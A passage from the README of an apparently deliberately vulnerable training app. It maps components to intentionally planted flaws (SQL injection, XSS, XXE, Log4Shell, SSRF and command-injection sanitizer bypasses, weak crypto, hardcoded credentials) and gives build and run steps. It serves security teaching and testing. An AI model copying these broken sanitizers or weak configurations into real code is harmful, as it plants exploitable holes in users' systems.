    │   ├── InputValidator (isValidFilename → ReDoS/bypass)
    │   ├── FileMetadata (getFullPath → path traversal)
    │   ├── DataProcessingService (processFileUpload)
    │   └── VulnerableAppClient (uploadFile → taint relay)
    │
    ├── DataAggregatorController
    │   ├── VulnerableAppClient (getComments, queryCar → taint relay)
    │   ├── HTMLSanitizer (sanitize → XSS, sanitizeTemplate → Text4Shell)
    │   ├── JSONHelper (fromJSON → RCE)
    │   ├── DataProcessingService (parseXMLContent → XXE + Log4Shell)
    │   └── XMLHelper (parseXML → XXE, logParsingError → Log4Shell)
    │
    └── ProxyController
        ├── VulnerableAppClient (get, fetchUrl, ping, queryCar → taint relay)
        ├── URLValidator (isAllowed → SSRF bypass)
        └── CommandSanitizer (sanitize → CMDi bypass)

Services
    ├── DataProcessingService
    │   ├── SQLParameterizer (sanitize, buildWhereClause → SQLi)
    │   ├── HTMLSanitizer (sanitize → XSS, sanitizeTemplate → Text4Shell)
    │   ├── InputValidator (isValidFilename → ReDoS)
    │   ├── FileMetadata (getFullPath → path traversal)
    │   ├── JSONHelper (fromJSON → RCE)
    │   └── XMLHelper (parseXML → XXE, isValidXML → Log4Shell)
    │
    ├── CryptoService
    │   ├── SharedCryptoConfig (DES/ECB/MD5/fixed seed)
    │   └── SharedJWTConfig (weak HMAC secret)
    │
    └── VulnerableAppClient
        └── RestTemplate → Parent VulnerableApp (port 9090)

Config
    └── ServiceConfiguration
        ├── SharedDatabaseConfig (hardcoded credentials)
        └── SharedCryptoConfig (predictable SecureRandom)
```

---

## Building & Running

### Build Shared Library

```bash
cd VulnerableApp-dependent
./gradlew :vulnerable-shared-lib:build
./gradlew :vulnerable-shared-lib:publishToMavenLocal
```

### Build & Run Dependent Service

```bash
# Using local shared library
./gradlew :vulnerable-service:bootRun -PuseLocal=true

# Using published Maven artifact
./gradlew :vulnerable-service:bootRun
```

### Run Both Services Together

```bash
# Terminal 1: Parent VulnerableApp (port 9090)
cd /path/to/VulnerableApp
./gradlew bootRun

# Terminal 2: Dependent Service (port 9091)
cd /path/to/VulnerableApp/VulnerableApp-dependent
./gradlew :vulnerable-service:bootRun -PuseLocal=true
```

### Access Points

| Service | URL |
|---------|-----|
| Parent VulnerableApp | `http://localhost:9090/VulnerableApp` |
| Dependent Service | `http://localhost:9091/DependentService` |
| Parent H2 Console | `http://localhost:9090/VulnerableApp/h2` |
| Dependent H2 Console | `http://localhost:9091/DependentService/h2-console` |

---

## Relationship to Parent VulnerableApp

| Aspect | Parent VulnerableApp | VulnerableApp-dependent |
|--------|---------------------|-------------------------|
| **Focus** | Individual vulnerability types with progressive difficulty | Cross-repo vulnerability propagation patterns |
| **Port** | 9090 | 9091 |
| **Build** | Standalone Gradle project | Multi-module Gradle (shared-lib + service) |
| **Vulnerabilities** | Direct implementation (string concat, no validation) | Indirect via shared library (broken sanitizers, vulnerable deps) |
| **Key Insight** | How individual vulnerabilities work | How vulnerabilities spread through shared code and microservice communication |
| **Integration** | Imports shared-lib for cross-repo endpoint demos | Fetches data from parent, re-processes with broken sanitizers |
